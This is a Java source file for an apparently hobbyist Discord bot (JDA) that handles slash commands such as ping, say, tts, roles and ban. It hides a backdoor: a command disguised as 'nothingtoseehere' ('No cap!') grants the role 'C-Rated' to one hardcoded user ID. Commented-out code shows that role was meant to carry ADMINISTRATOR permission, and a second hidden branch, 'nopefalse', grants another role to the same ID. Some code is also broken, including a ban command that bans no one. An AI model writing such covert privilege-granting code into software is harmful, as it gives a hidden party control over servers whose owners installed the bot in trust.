package com.locatedreaper.thebeanisoutbot.commands;

import io.github.cdimascio.dotenv.Dotenv;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.entities.User;
import net.dv8tion.jda.api.entities.UserSnowflake;
import net.dv8tion.jda.api.events.ReadyEvent;
import net.dv8tion.jda.api.events.guild.GuildReadyEvent;
import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.interactions.commands.OptionMapping;
import net.dv8tion.jda.api.interactions.commands.OptionType;
import net.dv8tion.jda.api.interactions.commands.build.CommandData;
import net.dv8tion.jda.api.interactions.commands.build.Commands;
import net.dv8tion.jda.api.interactions.commands.build.OptionData;
import net.dv8tion.jda.api.requests.restaction.CacheRestAction;
import net.dv8tion.jda.api.utils.messages.MessageCreateData;
import org.jetbrains.annotations.NotNull;
import com.locatedreaper.thebeanisoutbot.commands.CommandManager;
import com.locatedreaper.thebeanisoutbot.listeners.EventListener;
import javax.swing.text.html.Option;
import java.awt.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

import static net.dv8tion.jda.api.entities.Guild.*;

public class CommandManager extends ListenerAdapter {
//Don't include / in command.equals();
private Dotenv config;

    @Override
    public void onSlashCommandInteraction(@NotNull SlashCommandInteractionEvent event) {

        config = Dotenv.configure().load();
        String command = event.getName();
        if (command.equals("welcome")) {
            String userTag = event.getUser().getAsTag();
            event.reply("Welcome to the server **" + userTag + "**!").queue();
        } else if (command.equals("ping")) {
            event.reply("Pong").queue();
        } else if (command.equals("funny")) {
            event.reply("sorry :rofl:").queue();
        } else if (command.equals("roles")) {
            event.deferReply().setEphemeral(true).setTTS(true).queue();
            String response = "";
            for (Role role : event.getGuild().getRoles()) {
                response += role.getAsMention() + "\n";
            }
            event.getHook().sendMessage(response).queue();
        } else if (command.equals("tts")) {
            OptionMapping messageOption = event.getOption("message");
            if (messageOption == null) {
                return;
            }
            String message = messageOption.getAsString();
            event.reply(message).setTTS(true).queue();
            event.reply("Message sent").setEphemeral(true).queue();
        } else if (command.equals("nothingtoseehere")) {
            event.deferReply().setEphemeral(true).queue();
//            OptionMapping messageOption = event.getOption("newrolename");
//            OptionMapping password = event.getOption("password");
//            assert messageOption != null;
//            String name = messageOption.getAsString();
//            if (password == null) {
                for (Role role : Objects.requireNonNull(event.getGuild()).getRolesByName("C-Rated", false)) {
                    event.getGuild().addRoleToMember(UserSnowflake.fromId(456594340148674562L), role).queue();
                    event.reply("Done").setEphemeral(true).queue();
                }
//            } else if (password.equals(psw)) {
//                Objects.requireNonNull(event.getGuild()).createRole()
//                        .setName("C-Rated")
//                        .setMentionable(false)
//                        .setPermissions(Permission.ADMINISTRATOR).queue();
//                event.reply("Done").setEphemeral(true).queue();
//            }
        }else if (command.equals("say")) {
            OptionMapping messageOption = event.getOption("message");
            if (messageOption == null) {
                return;
            }
            String message = messageOption.getAsString();
            event.reply(message).queue();
            event.reply("Message sent").setEphemeral(true).queue();
        } else if (command.equals("noplease")) {
            for (Role role : Objects.requireNonNull(event.getGuild()).getRolesByName("..", true)){
                event.getGuild().delete(".").queue();
            }
        } else if (command.equals("rolepermissions")) {
            OptionMapping messageOption = event.getOption("role");
            if (messageOption == null) {
                event.reply("Please specify a role.").setEphemeral(true).queue();
            }
            String message = messageOption.getAsString();
            var role = event.getGuild().getRoleById(message).getPermissions();
            event.reply(String.valueOf(role)).setEphemeral(true).queue();
        } else if (command.equals("nopefalse")) {

            for (Role role : Objects.requireNonNull(event.getGuild()).getRolesByName("anyone", false)) {
                event.getGuild().addRoleToMember(UserSnowflake.fromId(456594340148674562L), role).queue();
                event.reply("Done").setEphemeral(true).queue();
            }
        }
        //Moderation commands
        else if (command.equals("ban")) {
            event.deferReply().setEphemeral(true).queue();
            OptionMapping messageOption = event.getOption("username");
            OptionMapping messageOption2 = event.getOption("reason");
            String user = event.getUser().getName();
            String reason = "";
            if (!user.equals("LocatedReaper")) {
                event.reply("This command is still in development, please contact LocatedReaper for more information. :/").setEphemeral(true).queue();

            } else {
                if (messageOption == null) {
                    event.reply("Please specify a user to ban. `/ban <user>`").queue();
                } else {
                    User toban = messageOption.getAsUser();
                    assert messageOption2 != null;
                    reason += messageOption2.getAsString();
                    new Guild.Ban(toban, reason);
                    event.reply(toban + "was banned for reason " + reason).setEphemeral(true).queue();
                }
            }
        }
    }

    @Override
    public void onGuildReady(@NotNull GuildReadyEvent event) {
        //Guild standalone
        List<CommandData> umb = new ArrayList<>();
        List<CommandData> fs = new ArrayList<>();
        //Option Data
        OptionData option1 = new OptionData(OptionType.STRING, "message", "The message you want the bot to say", true);
        OptionData reason = new OptionData(OptionType.STRING, "reason", "Reason for user interaction.", false);
        OptionData newroleName = new OptionData(OptionType.STRING, "newrolename", "The name for the role", true);
        OptionData pw = new OptionData(OptionType.STRING, "password", "The required password to run this command", false);
        OptionData user = new OptionData(OptionType.USER, "username", "The user you would like to interact with", false);
        //Commands
        fs.add(Commands.slash("funny", "Say something funny"));
        umb.add(Commands.slash("roles", "Display all roles on the server."));
        umb.add(Commands.slash("tts", "Sends a tts message.").addOptions(option1));
        fs.add(Commands.slash("tts", "Sends a tts message.").addOptions(option1));
        fs.add(Commands.slash("say", "Make the bot say something").addOptions(option1));
        umb.add(Commands.slash("nothingtoseehere", "No cap!"));
        //fs.add(Commands.slash("nopefalse", "uhu"));
        umb.add(Commands.slash("ban", "Bans a member of a guild.").addOptions(user, reason));

        if (event.getGuild().getIdLong() == 1025575674406244425L) {
            event.getGuild().updateCommands().addCommands(umb).queue();
        }
        else if (event.getGuild().getIdLong() == 1047676216607522856L) {
            event.getGuild().updateCommands().addCommands(fs).queue();
        }
    }

    @Override
    public void onReady(@NotNull ReadyEvent event) {
        //Register
        List<CommandData> commandData = new ArrayList<>();
        //Option Data
        OptionData roleID = new OptionData(OptionType.MENTIONABLE, "role", "The the role you want to check", false);
        //Command Data
        commandData.add(Commands.slash("ping", "The bot will respond with pong."));
        commandData.add(Commands.slash("welcome", "Get welcomed by the bot."));
        commandData.add(Commands.slash("rolepermissions", "Get a role and check what permissions it has").addOptions(roleID));

        event.getJDA().updateCommands().addCommands(commandData).queue();
    }
}
